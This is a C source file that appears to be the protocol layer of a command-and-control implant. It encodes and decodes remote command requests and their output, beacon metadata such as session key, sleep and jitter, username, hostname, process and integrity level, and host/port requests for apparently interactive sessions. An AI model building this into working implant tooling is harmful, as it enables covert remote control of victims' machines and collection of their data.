#include <string.h>
#include <stdint.h>
#include "protocol.h"

static void put_u16(uint8_t *b, uint16_t v) {
    b[0] = (uint8_t)(v & 0xFF);
    b[1] = (uint8_t)((v >> 8) & 0xFF);
}

static void put_u32(uint8_t *b, uint32_t v) {
    b[0] = (uint8_t)(v & 0xFF);
    b[1] = (uint8_t)((v >> 8) & 0xFF);
    b[2] = (uint8_t)((v >> 16) & 0xFF);
    b[3] = (uint8_t)((v >> 24) & 0xFF);
}

static uint16_t get_u16(const uint8_t *b) {
    return (uint16_t)b[0] | ((uint16_t)b[1] << 8);
}

static uint32_t get_u32(const uint8_t *b) {
    return (uint32_t)b[0]
         | ((uint32_t)b[1] << 8)
         | ((uint32_t)b[2] << 16)
         | ((uint32_t)b[3] << 24);
}

void encode_header(const task_header_t *h, uint8_t *out) {
    out[0] = h->type;
    out[1] = h->code;
    put_u16(out + 2,  h->flags);
    put_u32(out + 4,  h->label);
    put_u32(out + 8,  h->identifier);
    put_u32(out + 12, h->length);
}

void decode_header(const uint8_t *buf, task_header_t *out) {
    out->type       = buf[0];
    out->code       = buf[1];
    out->flags      = get_u16(buf + 2);
    out->label      = get_u32(buf + 4);
    out->identifier = get_u32(buf + 8);
    out->length     = get_u32(buf + 12);
}

void encode_run_req(const char *cmd, uint8_t *out, int *out_len) {
    uint32_t n = (uint32_t)strlen(cmd);
    put_u32(out, n);
    memcpy(out + 4, cmd, n);
    *out_len = 4 + (int)n;
}

void decode_run_req(const uint8_t *buf, int buf_len, char *out_cmd, int max_len) {
    if (buf_len < 4 || max_len < 1) { out_cmd[0] = '\0'; return; }
    uint32_t n = get_u32(buf);
    uint32_t avail = (uint32_t)(buf_len - 4);
    if (n > avail)                n = avail;
    if (n >= (uint32_t)max_len)   n = (uint32_t)(max_len - 1);
    memcpy(out_cmd, buf + 4, n);
    out_cmd[n] = '\0';
}

void encode_run_rep(const char *output, uint8_t *out, int *out_len) {
    encode_run_req(output, out, out_len);
}

static int write_opt_u32(uint8_t *buf, uint32_t v) {
    buf[0] = 0x01;
    put_u32(buf + 1, v);
    return 5;
}

static int write_opt_u8(uint8_t *buf, uint8_t v) {
    buf[0] = 0x01;
    buf[1] = v;
    return 2;
}

static int write_opt_str(uint8_t *buf, const char *s) {
    if (!s || s[0] == '\0') { buf[0] = 0x00; return 1; }
    uint32_t n = (uint32_t)strlen(s);
    buf[0] = 0x01;
    put_u32(buf + 1, n);
    memcpy(buf + 5, s, n);
    return 5 + (int)n;
}

void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len) {
    int pos = 0;
    put_u32(out + pos, meta->id);
    pos += 4;
    memcpy(out + pos, meta->session_key, 32);
    pos += 32;
    pos += write_opt_u32(out + pos, meta->sleep);
    pos += write_opt_u32(out + pos, meta->jitter);
    pos += write_opt_str(out + pos, meta->username);
    pos += write_opt_str(out + pos, meta->hostname);
    pos += write_opt_str(out + pos, meta->process_name);
    pos += write_opt_u32(out + pos, meta->process_id);
    pos += write_opt_u8(out + pos,  meta->arch);
    pos += write_opt_u8(out + pos,  meta->platform);
    pos += write_opt_u8(out + pos,  meta->integrity);
    *out_len = pos;
}

int parse_interactive_req(const uint8_t *buf, int buf_len,
                          char *out_host, int max_host, uint16_t *out_port) {
    if (buf_len < 6 || max_host < 1) return -1;
    uint32_t host_len = get_u32(buf);
    if ((int)(4 + host_len + 2) > buf_len) return -1;
    uint32_t copy_len = host_len;
    if (copy_len >= (uint32_t)max_host) copy_len = (uint32_t)(max_host - 1);
    memcpy(out_host, buf + 4, copy_len);
    out_host[copy_len] = '\0';
    *out_port = get_u16(buf + 4 + host_len);
    return 0;
}
